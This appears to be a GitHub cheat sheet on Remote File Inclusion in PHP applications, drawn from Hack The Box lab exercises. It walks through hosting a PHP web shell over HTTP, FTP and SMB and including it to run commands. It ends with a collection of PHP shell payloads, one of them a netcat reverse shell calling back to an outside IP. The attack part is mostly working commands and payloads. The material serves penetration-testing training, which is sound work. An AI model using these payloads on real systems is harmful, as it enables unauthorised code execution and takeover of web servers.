# Remote File Inclusion!
## @Author : M3tr1c_r00t
![image](https://user-images.githubusercontent.com/99975622/213495218-dc5119e4-01e0-4b8a-9606-56aa9f5aba45.png)
An RFi occurs when a vulnerable function allows the inclusion of remote URLs.

This allows two main benefits:
- Enumerating local-only ports and web applications (i.e. SSRF)
- Gaining remote code execution by including a malicious script that we host

When a vulnerable function allows us to include remote files, we may be able to host a malicious script, and then include it in the vulnerable page to execute malicious functions and gain remote code execution.

The following are some of the functions that (if vulnerable) would allow RFI:
![image](https://user-images.githubusercontent.com/99975622/213495980-52266241-187f-4eb9-854a-fd3aa670089d.png)

As we can see, almost any RFI vulnerability is also an LFI vulnerability, as any function that allows including remote URLs usually also allows including local ones. 
However, an LFI may not necessarily be an RFI. This is primarily because of three reasons:
- The vulnerable function may not allow including remote URLs
- You may only control a portion of the filename and not the entire protocol wrapper (ex: http://, ftp://, https://).
- The configuration may prevent RFI altogether, as most modern web servers disable including remote files by default.

Furthermore, as we may note in the above table, some functions do allow including remote URLs but do not allow code execution. In this case, we would still be able to exploit the vulnerability to enumerate local ports and web applications through SSRF.

### Verify RFI
The  allow_url_include setting to be enabled in the config file...
```
MetricCode@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include

allow_url_include = On
```

A more reliable way to determine whether an LFI vulnerability is also vulnerable to RFI is to try and include a URL, and see if we can get its content. 
At first, we should always start by trying to include a local URL to ensure our attempt does not get blocked by a firewall or other security measures.

If the page did not get included as source code text but got executed and rendered as PHP, so the vulnerable function also allows PHP execution, which may allow us to execute code if we include a malicious PHP script that we host on our machine.

If the back-end server hosted any other local web applications (e.g. port 8080), then we may be able to access them through the RFI vulnerability by applying SSRF techniques on it.

Note: It may not be ideal to include the vulnerable page itself (i.e. index.php), as this may cause a recursive inclusion loop and cause a DoS to the back-end server.

### Remote Code Execution with RFI
Creating an malicious script...
```
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

#### HTTP
 ``` 
MetricCode@htb[/htb]$ sudo python3 -m http.server 1111
Serving HTTP on 0.0.0.0 port 1111 (http://0.0.0.0:1111/) ...
```
Running the script;
```
:http://example.com/index.php?language=http://<OUR_IP>:1111/shell.php&cmd=id
```
#### FTP
 We can start a basic FTP server with Python's pyftpdlib, as follows:
 ```
 MetricCode@htb[/htb]$ sudo python -m pyftpdlib -p 21
[SNIP] >>> starting FTP server on 0.0.0.0:21, pid=23686 <<<
[SNIP] concurrency model: async
[SNIP] masquerade (NAT) address: None
[SNIP] passive ports: None
 ```
 
 Execution...
 ```
 :http://example.com/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id
 ```
 By default, PHP tries to authenticate as an anonymous user. If the server requires valid authentication, then the credentials can be specified in the URL, as follows:
 
 ```
 MetricCode@htb[/htb]$ curl 'http://example.com/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
...SNIP...

uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
#### SMB
If the vulnerable web application is hosted on a Windows server (which we can tell from the server version in the HTTP response headers), then we do not need the allow_url_include setting to be enabled for RFI exploitation, as we can utilize the SMB protocol for the remote file inclusion. This is because Windows treats files on remote SMB servers as normal files, which can be referenced directly with a UNC path.

We can spin up an SMB server using Impacket's smbserver.py, which allows anonymous authentication by default, as follows:
```
MetricCode@htb[/htb]$ impacket-smbserver -smb2support share $(pwd)
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```
Now, we can include our script by using a UNC path (e.g. \\<OUR_IP>\shell.php), and specify the command with (&cmd=whoami) as we did earlier:
```
:http://example.com/index.php?language=\\<OUR_IP>\shell.php&cmd=whoami
```

For smb, we do not need any non-default settings to be enabled.
 However, we must note that this technique is more likely to work if we were on the same network, as accessing remote SMB servers over the internet may be disabled by default, depending on the Windows server configurations.
 
## PHP Malicious Scripts
```
<?php system($_GET['c']); ?>
<?php system($_REQUEST['c']$); ?>

<?php
$os = shell_exec('id');
echo "<pre>$os</pre>";
?>

<?php
$os = shell_exec('nc 10.10.10.10 4444 -e /bin/bash');
?>

// Replace IP & Port

Dangerous PHP Functions that can be abused for RCE
<?php
print_r(preg_grep("/^(system|exec|shell_exec|passthru|proc_open|popen|curl_exec|curl_multi_exec|parse_ini_file|show_source)$/", get_defined_functions(TRUE)["internal"]));
?>
```
